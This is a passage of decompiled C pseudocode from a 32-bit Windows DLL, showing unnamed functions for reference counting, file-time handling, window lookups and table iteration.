  else
    v2 = 0;
  a1[1] = v2;
  *a1 = a2;
  return a1;
}

//----- (10003914) --------------------------------------------------------
_DWORD *__usercall sub_10003914@<eax>(_DWORD *a1@<ecx>, int a2@<edi>)
{
  _DWORD *result; // eax

  result = &loc_1005FA54;
  if ( *a1 != a2 )
  {
    sub_10002C83((int)a1);
    result = operator new(4u);
    if ( result )
      *result = 1;
    else
      result = 0;
    a1[1] = result;
    *a1 = a2;
  }
  return result;
}

//----- (10003967) --------------------------------------------------------
int __stdcall sub_10003967(int a1, int a2)
{
  int v3; // [esp+0h] [ebp-3Ch] BYREF
  _DWORD v4[3]; // [esp+Ch] [ebp-30h] BYREF
  _DWORD v5[3]; // [esp+18h] [ebp-24h] BYREF
  _DWORD v6[3]; // [esp+24h] [ebp-18h] BYREF
  int v7; // [esp+38h] [ebp-4h]

  v6[2] = &v3;
  v7 = 0;
  sub_100160AB(v6);
  LOBYTE(v7) = 1;
  sub_10011EED((int)v4);
  LOBYTE(v7) = 2;
  sub_10016F8F(v5);
  LOBYTE(v7) = 3;
  sub_1000FC57();
  if ( a2 == 1 )
  {
    dword_1008FBB4 = a1;
    sub_10003AC1();
  }
  LOBYTE(v7) = 2;
  sub_10016FD0(v5);
  LOBYTE(v7) = 1;
  sub_10011F2B(v4);
  LOBYTE(v7) = 0;
  sub_100160E1(v6);
  return 1;
}
// 1008FBB4: using guessed type int dword_1008FBB4;
// 10003967: using guessed type _DWORD var_30[3];
// 10003967: using guessed type _DWORD var_24[3];

//----- (10003A00) --------------------------------------------------------
int sub_10003A00()
{
  wchar_t *v0; // eax
  volatile LONG *v1; // ecx
  _DWORD *v2; // eax
  int v3; // esi
  volatile LONG *v5; // [esp-8h] [ebp-60h] BYREF
  volatile LONG *v6; // [esp-4h] [ebp-5Ch]
  int v7; // [esp+0h] [ebp-58h] BYREF
  int v8[10]; // [esp+Ch] [ebp-4Ch] BYREF
  char v9[8]; // [esp+34h] [ebp-24h] BYREF
  int v10[4]; // [esp+3Ch] [ebp-1Ch] BYREF
  int v11; // [esp+54h] [ebp-4h]

  v10[3] = (int)&v7;
  v11 = 0;
  v0 = (wchar_t *)sub_1000BE16((int)&unk_1008FBB8);
  sub_1000B9A0(v10, v0);
  LOBYTE(v11) = 1;
  sub_1000BB4C((int)v10);
  v6 = v1;
  v5 = v1;
  v10[2] = (int)&v5;
  sub_10018B3B(&v5);
  LOBYTE(v11) = 1;
  v2 = sub_10017C15(-1, 0x80000000, v8, (int)v10, 128, -1, (int)v5, v6);
  LOBYTE(v11) = 3;
  v3 = *(_DWORD *)(*(int (__thiscall **)(_DWORD *, char *, int))(*v2 + 80))(v2, v9, 1);
  LOBYTE(v11) = 1;
  sub_10017D5E((int)v8);
  LOBYTE(v11) = 0;
  sub_1000BA51(v10);
  return v3;
}
// 10003A38: variable 'v1' is possibly undefined
// 10003A00: using guessed type char var_24[8];

//----- (10003AC1) --------------------------------------------------------
void sub_10003AC1()
{
  DWORD v0; // edx
  int v1; // [esp+0h] [ebp-34h] BYREF
  int v2[2]; // [esp+Ch] [ebp-28h] BYREF
  int v3[2]; // [esp+14h] [ebp-20h] BYREF
  FILETIME v4; // [esp+1Ch] [ebp-18h] BYREF
  int *v5; // [esp+24h] [ebp-10h]
  int v6; // [esp+30h] [ebp-4h]

  v5 = &v1;
  v6 = 0;
  sub_1000BA21(v2, (int)&unk_10095408);
  LOBYTE(v6) = 1;
  sub_1000BB4C((int)v2);
  sub_1000BA21(v3, (int)&unk_100950F0);
  LOBYTE(v6) = 2;
  sub_1000BB4C((int)v3);
  v4.dwLowDateTime = sub_10003A00();
  v4.dwHighDateTime = v0;
  sub_10003B67((int)v2, &v4);
  sub_10003B67((int)v3, &v4);
  LOBYTE(v6) = 1;
  sub_1000BA51(v3);
  LOBYTE(v6) = 0;
  sub_1000BA51(v2);
}
// 10003B14: variable 'v0' is possibly undefined

//----- (10003B67) --------------------------------------------------------
void __cdecl sub_10003B67(int a1, FILETIME *a2)
{
  volatile LONG *v2; // ecx
  volatile LONG *v3; // [esp-8h] [ebp-78h] BYREF
  volatile LONG *v4; // [esp-4h] [ebp-74h]
  int v5; // [esp+0h] [ebp-70h] BYREF
  int v6[22]; // [esp+Ch] [ebp-64h] BYREF
  int v7; // [esp+6Ch] [ebp-4h]

  v6[21] = (int)&v5;
  v7 = 0;
  v4 = v2;
  v3 = v2;
  v6[20] = (int)&v3;
  sub_10018A88(&v3);
  LOBYTE(v7) = 0;
  sub_100170B2((int)v6, a1, a2, (int)v3, v4);
  LOBYTE(v7) = 2;
  sub_10017229(v6);
  sub_10018120((HANDLE *)v6, a2, 1);
  sub_10017584((HANDLE *)v6, a2, 1);
  sub_10017574((HANDLE *)v6);
  LOBYTE(v7) = 0;
  sub_100171E7((HANDLE *)v6);
}
// 10003B7F: variable 'v2' is possibly undefined

//----- (10003BF9) --------------------------------------------------------
bool sub_10003BF9()
{
  char *v0; // edi
  int v1; // ebx
  _DWORD *v2; // eax
  _DWORD *v3; // eax
  _DWORD *v4; // eax
  BOOL v5; // ebx
  int v7; // [esp+14h] [ebp-3Ch] BYREF
  _DWORD v8[4]; // [esp+1Ch] [ebp-34h] BYREF
  int v9[6]; // [esp+2Ch] [ebp-24h] BYREF
  int v10; // [esp+4Ch] [ebp-4h]

  sub_100152F9(v8);
  v10 = 0;
  sub_10016114(v9, (int)v8);
  LOBYTE(v10) = 1;
  v0 = (char *)&unk_10095110;
  v1 = 95;
  do
  {
    v2 = operator new(0x10u);
    LOBYTE(v10) = 2;
    if ( v2 )
      v3 = sub_10015F22(v2, (int)v0, (int)v8);
    else
      v3 = 0;
    LOBYTE(v10) = 1;
    v4 = sub_10003D5D(&v7, (int)v3);
    LOBYTE(v10) = 3;
    sub_10003CE0(v9, (int)v4);
    LOBYTE(v10) = 1;
    sub_10003DA1();
    v0 += 8;
    --v1;
  }
  while ( v1 );
  v5 = sub_1001618A(v9) != -1;
  LOBYTE(v10) = 0;
  sub_10016166(v9);
  v10 = -1;
  sub_10015325(v8);
  return v5;
}
// 10003BF9: using guessed type _DWORD var_34[4];
// 10003BF9: using guessed type int var_24[6];

//----- (10003CE0) --------------------------------------------------------
void __thiscall sub_10003CE0(void *this, int a2)
{
  int v2[2]; // [esp+0h] [ebp-14h] BYREF
  int v3; // [esp+10h] [ebp-4h]

  (*(void (__thiscall **)(void *, int *))(*(_DWORD *)this + 20))(this, v2);
  v3 = 0;
  (*(void (__thiscall **)(int, int))(*(_DWORD *)v2[0] + 28))(v2[0], a2);
  v3 = -1;
  sub_10003DDA(v2);
}

//----- (10003D24) --------------------------------------------------------
void __thiscall sub_10003D24(void *this)
{
  _DWORD v1[7]; // [esp+0h] [ebp-1Ch] BYREF

  v1[3] = v1;
  v1[6] = 0;
  sub_10003E16((int)this);
}

//----- (10003D5D) --------------------------------------------------------
_DWORD *__userpurge sub_10003D5D@<eax>(_DWORD *a1@<esi>, int a2)
{
  _DWORD *v2; // eax

  v2 = operator new(4u);
  if ( v2 )
    *v2 = 1;
  else
    v2 = 0;
  a1[1] = v2;
  *a1 = a2;
  return a1;
}

//----- (10003DA1) --------------------------------------------------------
int sub_10003DA1()
{
  _DWORD v1[7]; // [esp+0h] [ebp-1Ch] BYREF

  v1[3] = v1;
  v1[6] = 0;
  return sub_10003E3E();
}
// 10003E3E: using guessed type int sub_10003E3E(void);

//----- (10003DDA) --------------------------------------------------------
void __thiscall sub_10003DDA(void *this)
{
  _DWORD v1[7]; // [esp+0h] [ebp-1Ch] BYREF

  v1[3] = v1;
  v1[6] = 0;
  sub_10003E66((int)this);
}

//----- (10003E16) --------------------------------------------------------
void __usercall sub_10003E16(int a1@<esi>)
{
  if ( !InterlockedDecrement(*(volatile LONG **)(a1 + 4)) )
  {
    if ( *(_DWORD *)(a1 + 4) )
      j__free(*(void **)(a1 + 4));
    if ( *(_DWORD *)a1 )
      (***(void (__thiscall ****)(_DWORD, int))a1)(*(_DWORD *)a1, 1);
  }
}

//----- (10003E3E) --------------------------------------------------------
void __usercall sub_10003E3E(int a1@<esi>)
{
  if ( !InterlockedDecrement(*(volatile LONG **)(a1 + 4)) )
  {
    if ( *(_DWORD *)(a1 + 4) )
      j__free(*(void **)(a1 + 4));
    if ( *(_DWORD *)a1 )
      (***(void (__thiscall ****)(_DWORD, int))a1)(*(_DWORD *)a1, 1);
  }
}

//----- (10003E66) --------------------------------------------------------
void __usercall sub_10003E66(int a1@<esi>)
{
  if ( !InterlockedDecrement(*(volatile LONG **)(a1 + 4)) )
  {
    if ( *(_DWORD *)(a1 + 4) )
      j__free(*(void **)(a1 + 4));
    if ( *(_DWORD *)a1 )
      (***(void (__thiscall ****)(_DWORD, int))a1)(*(_DWORD *)a1, 1);
  }
}

//----- (10003E8E) --------------------------------------------------------
_DWORD *__stdcall sub_10003E8E(_DWORD *a1)
{
  _DWORD *v1; // edx

  sub_10018C9A(a1);
  v1[1] = 0;
  *v1 = &off_10072D0C;
  return v1;
}
// 10003EA5: variable 'v1' is possibly undefined
// 10072D0C: using guessed type int (__thiscall *off_10072D0C)(void *Block, char);

//----- (10003EC3) --------------------------------------------------------
_DWORD *__thiscall sub_10003EC3(_DWORD *Block, char a2)
{
  sub_10003EDF(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (10003EDF) --------------------------------------------------------
void __thiscall sub_10003EDF(_DWORD *this)
{
  *this = &off_10072D0C;
  sub_10018D0B(this);
}
// 10072D0C: using guessed type int (__thiscall *off_10072D0C)(void *Block, char);

//----- (10003F0D) --------------------------------------------------------
LONG __stdcall sub_10003F0D(int *a1)
{
  HWND DesktopWindow; // eax
  int v2; // eax
  _BYTE v4[20]; // [esp-14h] [ebp-98h] BYREF
  int v5; // [esp+0h] [ebp-84h] BYREF
  _DWORD v6[17]; // [esp+Ch] [ebp-78h] BYREF
  int v7[5]; // [esp+50h] [ebp-34h] BYREF
  _DWORD v8[5]; // [esp+64h] [ebp-20h] BYREF
  int v9; // [esp+80h] [ebp-4h]

  v8[4] = &v5;
  v9 = 0;
  sub_1000C28D(0, (int)v7, 0);
  LOBYTE(v9) = 1;
  sub_100092CE(v8);
  LOBYTE(v9) = 2;
  DesktopWindow = GetDesktopWindow();
  sub_10019177(v6, (int)DesktopWindow);
  LOBYTE(v9) = 3;
  sub_10019241((int)v6, (int)v7);
  v8[3] = v4;
  sub_1000C3F3(v7, (int)v4);
  LOBYTE(v9) = 4;
  v2 = *a1;
  LOBYTE(v9) = 3;
  (*(void (__thiscall **)(int *))(v2 + 76))(a1);
  LOBYTE(v9) = 2;
  sub_100191FD(v6);
  LOBYTE(v9) = 1;
  sub_100093FA(v8);
  LOBYTE(v9) = 0;
  return sub_1000C45D(v7);
}
// 10003F0D: using guessed type int var_34[5];
// 10003F0D: using guessed type _DWORD var_78[17];

//----- (10004017) --------------------------------------------------------
int __usercall sub_10004017@<eax>(int *a1@<esi>)
{
  int v1; // eax
  _DWORD v3[5]; // [esp-14h] [ebp-4Ch] BYREF
  int v4[10]; // [esp+0h] [ebp-38h] BYREF
  int v5; // [esp+28h] [ebp-10h] BYREF
  int v6; // [esp+34h] [ebp-4h]

  sub_10019D5C(v4);
  v6 = 0;
  sub_10019079(&v5);
  LOBYTE(v6) = 1;
  sub_10018D30(&v5, (int)v4);
  v4[9] = (int)v3;
  sub_10019EAB(v4, (int)v3);
  LOBYTE(v6) = 2;
  v1 = *a1;
  LOBYTE(v6) = 1;
  (*(void (__thiscall **)(int *, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD))(v1 + 76))(
    a1,
    v3[0],
    v3[1],
    v3[2],
    v3[3],
    v3[4]);
  LOBYTE(v6) = 0;
  sub_100190C5(&v5);
  v6 = -1;
  return sub_10019DBF((int)v4);
}

//----- (1000408E) --------------------------------------------------------
LONG __thiscall sub_1000408E(unsigned __int16 *this, int *a2)
{
  int v3; // edi
  DWORD v4; // eax
  int v6; // eax
  _DWORD v7[7]; // [esp-1Ch] [ebp-50h] BYREF
  _DWORD v8[10]; // [esp+0h] [ebp-34h] BYREF
  int v9; // [esp+30h] [ebp-4h]

  v8[9] = v8;
  v8[8] = this;
  v9 = 0;
  (*(void (__thiscall **)(int *, _DWORD))(*a2 + 56))(a2, this[2]);
  sub_10004017(a2);
  LOBYTE(v9) = 1;
  v3 = *a2;
  v4 = sub_10019C25();
  (*(void (__thiscall **)(int *, DWORD))(v3 + 60))(a2, v4);
  v9 = 0;
  if ( (*(unsigned __int8 (__thiscall **)(unsigned __int16 *))(*(_DWORD *)this + 20))(this) )
    return sub_10003F0D(a2);
  sub_1000C28D(0, (int)v7, 0);
  LOBYTE(v9) = 3;
  v6 = *a2;
  LOBYTE(v9) = 0;
  return (*(int (__thiscall **)(int *, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD))(v6 + 76))(
           a2,
           v7[0],
           v7[1],
           v7[2],
           v7[3],
           v7[4]);
}

//----- (1000414F) --------------------------------------------------------
_DWORD *__thiscall sub_1000414F(_DWORD *this, _DWORD *a2)
{
  volatile LONG *v4; // [esp-4h] [ebp-20h]
  volatile LONG *v5; // [esp-4h] [ebp-20h]

  sub_1000DEB4(this, (int)a2);
  *this = &off_10072D24;
  this[2] = a2[2];
  v4 = (volatile LONG *)this[2];
  this[1] = a2[1];
  InterlockedIncrement(v4);
  this[4] = a2[4];
  v5 = (volatile LONG *)this[4];
  this[3] = a2[3];
  InterlockedIncrement(v5);
  return this;
}
// 10072D24: using guessed type int (__thiscall *off_10072D24)(void *Block, char);

//----- (100041B8) --------------------------------------------------------
_DWORD *__thiscall sub_100041B8(_DWORD *Block, char a2)
{
  sub_10018F6F(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (100041E8) --------------------------------------------------------
void __thiscall sub_100041E8(void *this)
{
  _DWORD v1[7]; // [esp+0h] [ebp-1Ch] BYREF

  v1[3] = v1;
  v1[6] = 0;
  sub_10004280((int)this);
}

//----- (10004235) --------------------------------------------------------
void __thiscall sub_10004235(void *this)
{
  _DWORD v1[7]; // [esp+0h] [ebp-1Ch] BYREF

  v1[3] = v1;
  v1[6] = 0;
  sub_100042BA((int)this);
}

//----- (10004280) --------------------------------------------------------
void __usercall sub_10004280(int a1@<esi>)
{
  if ( !InterlockedDecrement(*(volatile LONG **)(a1 + 4)) )
  {
    if ( *(_DWORD *)(a1 + 4) )
      j__free(*(void **)(a1 + 4));
    if ( *(_DWORD *)a1 )
      (***(void (__thiscall ****)(_DWORD, int))a1)(*(_DWORD *)a1, 1);
  }
}

//----- (100042BA) --------------------------------------------------------
void __usercall sub_100042BA(int a1@<esi>)
{
  if ( !InterlockedDecrement(*(volatile LONG **)(a1 + 4)) )
  {
    if ( *(_DWORD *)(a1 + 4) )
      j__free(*(void **)(a1 + 4));
    if ( *(_DWORD *)a1 )
      (***(void (__thiscall ****)(_DWORD, int))a1)(*(_DWORD *)a1, 1);
  }
}

//----- (100042F6) --------------------------------------------------------
void __cdecl sub_100042F6(volatile LONG *a1, int a2, int a3, int a4, int a5, int a6, int a7, int a8)
{
  char v8; // bl
  _DWORD *v9; // eax
  int v10[3]; // [esp-14h] [ebp-D8h] BYREF
  volatile LONG *v11; // [esp-8h] [ebp-CCh] BYREF
  volatile LONG *v12; // [esp-4h] [ebp-C8h]
  char v13[48]; // [esp+10h] [ebp-B4h] BYREF
  int v14[9]; // [esp+40h] [ebp-84h] BYREF
  _DWORD v15[6]; // [esp+64h] [ebp-60h] BYREF
  _DWORD v16[4]; // [esp+7Ch] [ebp-48h] BYREF
  _BYTE v17[8]; // [esp+8Ch] [ebp-38h] BYREF
  int v18; // [esp+94h] [ebp-30h]
  char v19[8]; // [esp+A0h] [ebp-24h] BYREF
  volatile LONG *v20; // [esp+A8h] [ebp-1Ch] BYREF
  volatile LONG *lpAddend; // [esp+ACh] [ebp-18h]
  volatile LONG **v22; // [esp+B0h] [ebp-14h]
  char v23; // [esp+B7h] [ebp-Dh]
  int v24; // [esp+C0h] [ebp-4h]

  v24 = 2;
  v8 = !sub_1001A327((int)&a8);
  v23 = v8;
  lpAddend = (volatile LONG *)operator new(0x28u);
  if ( lpAddend )
  {
    v11 = v12;
    v22 = &v11;
    sub_10018B3B(&v11);
    LOBYTE(v24) = 2;
    v9 = sub_10017C15(0, 0x40000000, lpAddend, (int)&a8, 128, 4, (int)v11, v12);
    v8 = v23;
  }
  else
  {
    v9 = 0;
  }
  LOBYTE(v24) = 1;
  sub_10004726(&v20, (int)v9);
  LOBYTE(v24) = 4;
  v22 = &v11;
  v12 = lpAddend;
  v11 = v20;
  InterlockedIncrement(lpAddend);
  LOBYTE(v24) = 4;
  sub_1001B84C((int)v17, (int)v11, v12);
  LOBYTE(v24) = 6;
  if ( v8 == 1 )
    (*(void (__thiscall **)(int, int *))(*(_DWORD *)v18 + 56))(v18, &a2);
  sub_10019D5C(v14);
  LOBYTE(v24) = 7;
  sub_1001BD90((int)v19);
  LOBYTE(v24) = 8;
  sub_1001BA01((int)v13, (int)v14, (int)v19);
  LOBYTE(v24) = 9;
  v12 = a1;
  sub_1001BAD2(v13);
  sub_1001B6C1(v13);
  sub_1001BF4F(v15, (int)v17, a7);
  LOBYTE(v24) = 10;
  sub_1001B3FC(v16, (int)v15, 1);
  LOBYTE(v24) = 11;
  (*(void (__thiscall **)(int, _DWORD, int))(*(_DWORD *)v18 + 64))(v18, 0, 2);
  v22 = (volatile LONG **)v10;
  sub_10019EAB(v14, (int)v10);
  LOBYTE(v24) = 11;
  sub_1001B581(v16, v10[0], v10[1], v10[2], (int)v11, (int)v12);
  LOBYTE(v24) = 10;
  sub_1001B44E(v16);
  LOBYTE(v24) = 9;
  sub_1001BFAA(v15);
  LOBYTE(v24) = 8;
  sub_1001BA54((int)v13);
  LOBYTE(v24) = 7;
  sub_1001BE0A(v19);
  LOBYTE(v24) = 6;
  sub_10019DBF((int)v14);
  LOBYTE(v24) = 4;
  sub_1001B8BA(v17);
  LOBYTE(v24) = 1;
  sub_1000476A(&v20);
  LOBYTE(v24) = 0;
  sub_1000C45D(&a2);
  v24 = -1;
  sub_10009F65(&a8);
}
// 100042F6: using guessed type _BYTE var_38[8];
// 100042F6: using guessed type int var_84[9];
// 100042F6: using guessed type _DWORD var_60[6];
// 100042F6: using guessed type _DWORD var_48[4];

//----- (100044E6) --------------------------------------------------------
int __cdecl sub_100044E6(int *a1)
{
  int *v1; // esi
  int result; // eax
  int *v3; // eax
  _DWORD *v4; // eax
  int v5; // eax
  int v6; // ecx
  int v7; // esi
  int *v8; // eax
  _DWORD *v9; // eax
  int v10; // eax
  volatile LONG *v11; // [esp-24h] [ebp-128h]
  int v12[5]; // [esp-20h] [ebp-124h] BYREF
  int v13; // [esp-Ch] [ebp-110h]
  int v14[2]; // [esp-8h] [ebp-10Ch] BYREF
  int v15; // [esp+0h] [ebp-104h] BYREF
  int v16[3]; // [esp+Ch] [ebp-F8h] BYREF
  char v17[8]; // [esp+18h] [ebp-ECh] BYREF
  int v18; // [esp+20h] [ebp-E4h]
  int v19[9]; // [esp+98h] [ebp-6Ch] BYREF
  int v20[5]; // [esp+BCh] [ebp-48h] BYREF
  int v21[5]; // [esp+D0h] [ebp-34h] BYREF
  int v22[2]; // [esp+E4h] [ebp-20h] BYREF
  int v23[3]; // [esp+ECh] [ebp-18h] BYREF
  int v24; // [esp+100h] [ebp-4h]

  v23[2] = (int)&v15;
  v1 = a1;
  result = (*(int (__thiscall **)(int *))(*a1 + 16))(a1);
  if ( (_BYTE)result )
  {
    sub_10019D5C(v19);
    v24 = 0;
    sub_1000C28D(0, (int)v20, 0);
    LOBYTE(v24) = 1;
    sub_1000B9A0(v23, &word_1008FB38);
    LOBYTE(v24) = 3;
    (*(void (__thiscall **)(int *, int *))(*v1 + 4))(v1, v19);
    v24 = 2;
    HIBYTE(a1) = *((_WORD *)v1 + 2) > 0xBB8u;
    LOBYTE(v24) = 5;
    sub_10003597((int)&a1 + 3);
    sub_100016F0(dword_10091C08, v16);
    LOBYTE(v24) = 6;
    if ( HIBYTE(a1) )
    {
      v3 = (int *)sub_1000C28D((void *)6, (int)v21, &unk_10072BB0);
      LOBYTE(v24) = 7;
      sub_1000C439(v3, (int)v20);
      LOBYTE(v24) = 6;
      sub_1000C45D(v21);
      v4 = sub_1000BA21(v22, (int)v16);
      LOBYTE(v24) = 8;
      v5 = sub_1000BB4C((int)v4);
      sub_1000A0C4((int)v23, v5);
      LOBYTE(v24) = 6;
      sub_1000BA51(v22);
      v7 = v16[2];
    }
    else
    {
      v8 = (int *)sub_1000C28D((void *)6, (int)v21, &unk_10072BA8);
      LOBYTE(v24) = 9;
      sub_1000C439(v8, (int)v20);
      LOBYTE(v24) = 6;
      sub_1000C45D(v21);
      v9 = sub_1000BA21(v22, (int)v17);
      LOBYTE(v24) = 10;
      v10 = sub_1000BB4C((int)v9);
      sub_1000A0C4((int)v23, v10);
      LOBYTE(v24) = 6;
      sub_1000BA51(v22);
      v7 = v18;
    }
    v14[1] = v6;
    v14[0] = v6;
    a1 = v14;
    sub_10009F32(v14, (int)v23);
    LOBYTE(v24) = 11;
    v13 = v7;
    v22[1] = (int)v12;
    sub_1000C3F3(v20, (int)v12);
    LOBYTE(v24) = 12;
    v11 = (volatile LONG *)sub_10019EAB(v19, (int)v21);
    LOBYTE(v24) = 14;
    sub_100042F6(v11, v12[0], v12[1], v12[2], v12[3], v12[4], v13, v14[0]);
    LOBYTE(v24) = 6;
    sub_1000C45D(v21);
    LOBYTE(v24) = 5;
    sub_100010A5(v16);
    v24 = 1;
    sub_1000BA51(v23);
    LOBYTE(v24) = 0;
    sub_1000C45D(v20);
    v24 = -1;
    return sub_10019DBF((int)v19);
  }
  return result;
}
// 10004658: variable 'v6' is possibly undefined
// 10091C08: using guessed type int dword_10091C08;
// 100044E6: using guessed type int var_6C[9];
// 100044E6: using guessed type int var_48[5];
// 100044E6: using guessed type int var_34[5];
// 100044E6: using guessed type char var_EC[8];

//----- (10004726) --------------------------------------------------------
_DWORD *__userpurge sub_10004726@<eax>(_DWORD *a1@<esi>, int a2)
{
  _DWORD *v2; // eax

  v2 = operator new(4u);
  if ( v2 )
    *v2 = 1;
  else
    v2 = 0;
  a1[1] = v2;
  *a1 = a2;
  return a1;
}

//----- (1000476A) --------------------------------------------------------
void __thiscall sub_1000476A(void *this)
{
  _DWORD v1[7]; // [esp+0h] [ebp-1Ch] BYREF

  v1[3] = v1;
  v1[6] = 0;
  sub_100047B5((int)this);
}

//----- (100047B5) --------------------------------------------------------
void __usercall sub_100047B5(int a1@<esi>)
{
  if ( !InterlockedDecrement(*(volatile LONG **)(a1 + 4)) )
  {
    if ( *(_DWORD *)(a1 + 4) )
      j__free(*(void **)(a1 + 4));
    if ( *(_DWORD *)a1 )
      (***(void (__thiscall ****)(_DWORD, int))a1)(*(_DWORD *)a1, 1);
  }
}

//----- (100047E7) --------------------------------------------------------
_DWORD *__stdcall sub_100047E7(_DWORD *a1, int a2, int a3)
{
  sub_10003E8E(a1);
  *a1 = &off_10072D2C;
  sub_10009F32(a1 + 2, (int)&a2);
  a1[1] = 3003;
  sub_10009F65(&a2);
  return a1;
}
// 10072D2C: using guessed type int (__thiscall *off_10072D2C)(void *Block, char);

//----- (1000483E) --------------------------------------------------------
int *__thiscall sub_1000483E(int *Block, char a2)
{
  sub_1000485A(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (1000485A) --------------------------------------------------------
void __thiscall sub_1000485A(int *this)
{
  *this = (int)&off_10072D2C;
  sub_10009F65(this + 2);
  sub_10003EDF(this);
}
// 10072D2C: using guessed type int (__thiscall *off_10072D2C)(void *Block, char);

//----- (10004895) --------------------------------------------------------
char sub_10004895()
{
  return 1;
}

//----- (10004898) --------------------------------------------------------
char sub_10004898()
{
  return 1;
}

//----- (1000489B) --------------------------------------------------------
int __thiscall sub_1000489B(unsigned __int16 *this, int *a2)
{
  int v3; // ecx
  int v4; // eax
  int v6; // [esp-8h] [ebp-38h] BYREF
  int v7; // [esp-4h] [ebp-34h]
  _DWORD v8[9]; // [esp+0h] [ebp-30h] BYREF
  int v9; // [esp+2Ch] [ebp-4h]

  v8[8] = v8;
  sub_1000408E(this, a2);
  v9 = 0;
  v7 = v3;
  v6 = v3;
  sub_10009F32(&v6, (int)(this + 4));
  LOBYTE(v9) = 1;
  v4 = *a2;
  LOBYTE(v9) = 0;
  return (*(int (__thiscall **)(int *, int, int))(v4 + 72))(a2, v6, v7);
}
// 100048C0: variable 'v3' is possibly undefined

//----- (1000490A) --------------------------------------------------------
int sub_1000490A()
{
  return 47;
}

//----- (1000490E) --------------------------------------------------------
void __cdecl sub_1000490E(HWND hwnd)
{
  _DWORD *v1; // eax
  int v2[7]; // [esp+4h] [ebp-28h] BYREF
  int v3; // [esp+28h] [ebp-4h]

  v1 = sub_10006BE5(v2, hwnd);
  v3 = 0;
  sub_1000541B(&dword_100954C0, (int)v1);
  v3 = -1;
  sub_10006D31(v2);
}
// 100954C0: using guessed type int dword_100954C0;

//----- (1000494F) --------------------------------------------------------
char __stdcall sub_1000494F(int a1)
{
  _DWORD *v1; // eax
  int *v2; // esi
  int *v3; // edi
  int *v4; // ebx
  int *v5; // eax
  int v6; // ecx
  char v7; // bl
  int v9[7]; // [esp+Ch] [ebp-40h] BYREF
  int v10[2]; // [esp+28h] [ebp-24h] BYREF
  int v11[2]; // [esp+30h] [ebp-1Ch] BYREF
  int v12[2]; // [esp+38h] [ebp-14h] BYREF
  int v13; // [esp+48h] [ebp-4h]

  sub_1000518B(&dword_100954C0, v12);
  v13 = 0;
  while ( 1 )
  {
    if ( (*(unsigned __int8 (__thiscall **)(int))(*(_DWORD *)v12[0] + 4))(v12[0]) )
    {
      v7 = 0;
      goto LABEL_7;
    }
    v1 = (_DWORD *)(*(int (__thiscall **)(int))(*(_DWORD *)v12[0] + 12))(v12[0]);
    sub_10004A45(v1, v9);
    LOBYTE(v13) = 1;
    v2 = sub_1000BA21(v10, a1);
    LOBYTE(v13) = 2;
    v3 = sub_1000BA21(v11, (int)v9);
    LOBYTE(v13) = 3;
    v4 = sub_1000A531(v2);
    v5 = sub_1000A531(v3);
    LOBYTE(v4) = sub_1000A9B5((int)v4, (int)v5, 0) != -1;
    LOBYTE(v13) = 2;
    sub_1000BA51(v11);
    LOBYTE(v13) = 1;
    sub_1000BA51(v10);
    if ( (_BYTE)v4 )
      break;
    sub_100055B4(v6, v12[0]);
    LOBYTE(v13) = 0;
    sub_10006D31(v9);
  }
  LOBYTE(v13) = 0;
  sub_10006D31(v9);
  v7 = 1;
LABEL_7:
  v13 = -1;
  sub_100067AA(v12);
  return v7;
}
// 100049F2: variable 'v6' is possibly undefined
// 100954C0: using guessed type int dword_100954C0;
// 1000494F: using guessed type int var_40[7];

//----- (10004A45) --------------------------------------------------------
_DWORD *__userpurge sub_10004A45@<eax>(_DWORD *a1@<edi>, _DWORD *a2)
{
  sub_10009F32(a2, (int)a1);
  sub_10009F32(a2 + 2, (int)(a1 + 2));
  a2[4] = a1[4];
  a2[5] = a1[5];
  a2[6] = a1[6];
  return a2;
}

//----- (10004A96) --------------------------------------------------------
char __usercall sub_10004A96@<al>(int a1@<esi>)
{
  int v1; // edi
  int v2; // eax

  v1 = 0;
  if ( !(*(int (__thiscall **)(int))(*(_DWORD *)a1 + 4))(a1) )
    return 0;
  while ( 1 )
  {
    v2 = (*(int (__thiscall **)(int, int))(*(_DWORD *)a1 + 48))(a1, v1);
    if ( sub_1000494F(v2) )
      break;
    if ( ++v1 >= (unsigned int)(*(int (__thiscall **)(int))(*(_DWORD *)a1 + 4))(a1) )
      return 0;
  }
  return 1;
}

//----- (10004ACA) --------------------------------------------------------
char __stdcall sub_10004ACA(int a1)
{
  char v1; // bl
  int v3[14]; // [esp+8h] [ebp-98h] BYREF
  char v4[84]; // [esp+40h] [ebp-60h] BYREF
  int v5; // [esp+9Ch] [ebp-4h]

  sub_100035BB();
  sub_10004B3E(v3);
  v5 = 0;
  v1 = sub_10005AE2(v4, a1 + 8);
  v5 = -1;
  sub_100010A5(v3);
  return v1;
}
// 10004ACA: using guessed type int var_98[14];
// 10004ACA: using guessed type char var_60[84];

//----- (10004B3E) --------------------------------------------------------
_DWORD *__stdcall sub_10004B3E(_DWORD *a1)
{
  sub_10009D2C(a1, &word_10091B88);
  sub_10009D2C(a1 + 3, &word_10091B88);
  sub_10006715(a1 + 6);
  sub_10006715(a1 + 10);
  sub_10006715(a1 + 14);
  sub_10006715(a1 + 18);
  sub_10006715(a1 + 22);
  sub_10006715(a1 + 26);
  sub_10006715(a1 + 30);
  return a1;
}

//----- (10004BD8) --------------------------------------------------------
char __stdcall sub_10004BD8(int a1)
{
  char v1; // bl
  int v3[10]; // [esp+4h] [ebp-98h] BYREF
  char v4[100]; // [esp+2Ch] [ebp-70h] BYREF
  int v5; // [esp+98h] [ebp-4h]

  sub_100035BB();
  sub_10004B3E(v3);
  v5 = 0;
  v1 = sub_10005AE2(v4, a1 + 8);
  v5 = -1;
  sub_100010A5(v3);
  return v1;
}
// 10004BD8: using guessed type int var_98[10];
// 10004BD8: using guessed type char var_70[100];

//----- (10004C30) --------------------------------------------------------
char sub_10004C30()
{
  _DWORD *v0; // eax
  char v1; // bl
  int v3[35]; // [esp+8h] [ebp-98h] BYREF
  int v4; // [esp+9Ch] [ebp-4h]

  sub_100035BB();
  v0 = sub_100016F0(dword_10091C08, v3);
  v4 = 0;
  v1 = sub_10004A96((int)(v0 + 6));
  v4 = -1;
  sub_100010A5(v3);
  return v1;
}
// 10091C08: using guessed type int dword_10091C08;
// 10004C30: using guessed type int var_98[35];

//----- (10004C87) --------------------------------------------------------
